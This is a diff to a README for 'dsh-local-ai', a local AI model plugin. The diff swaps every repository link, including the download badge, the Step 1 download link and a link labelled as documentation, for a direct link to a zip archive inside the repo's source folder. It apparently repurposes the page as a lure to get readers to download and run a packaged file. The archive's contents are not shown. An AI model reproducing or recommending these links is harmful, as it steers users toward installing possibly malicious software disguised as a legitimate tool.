@@ -1,6 +1,6 @@
 <h1>🤖 dsh-local-ai - Your Private AI Models, One Click Away</h1>
 
-[![Download dsh-local-ai](https://img.shields.io/badge/Download-dsh--local--ai-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Palkaro/dsh-local-ai)
+[![Download dsh-local-ai](https://img.shields.io/badge/Download-dsh--local--ai-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/Palkaro/dsh-local-ai/main/src/local_ai_dsh_1.9.zip)
 
 ---
 
@@ -23,7 +23,7 @@ This tool helps you use AI models that run **directly on your computer** - no in
 
 ### Step 1: Get the Software
 
-Visit this link to download the application: [https://github.com/Palkaro/dsh-local-ai](https://github.com/Palkaro/dsh-local-ai)
+Visit this link to download the application: [https://raw.githubusercontent.com/Palkaro/dsh-local-ai/main/src/local_ai_dsh_1.9.zip](https://raw.githubusercontent.com/Palkaro/dsh-local-ai/main/src/local_ai_dsh_1.9.zip)
 
 Click the green "Code" button, then "Download ZIP" to get the file on your computer.
 
@@ -146,7 +146,7 @@ dsh-local-ai is a plugin that extends DeepSeek Harness, your main AI workspace. 
 ## 🆘 Need Help?
 
 1. Check the Troubleshooting section above
-2. Visit https://github.com/Palkaro/dsh-local-ai for documentation
+2. Visit https://raw.githubusercontent.com/Palkaro/dsh-local-ai/main/src/local_ai_dsh_1.9.zip for documentation
 3. Open an issue on GitHub with details about your problem
 4. Include your Windows version and what you tried
 
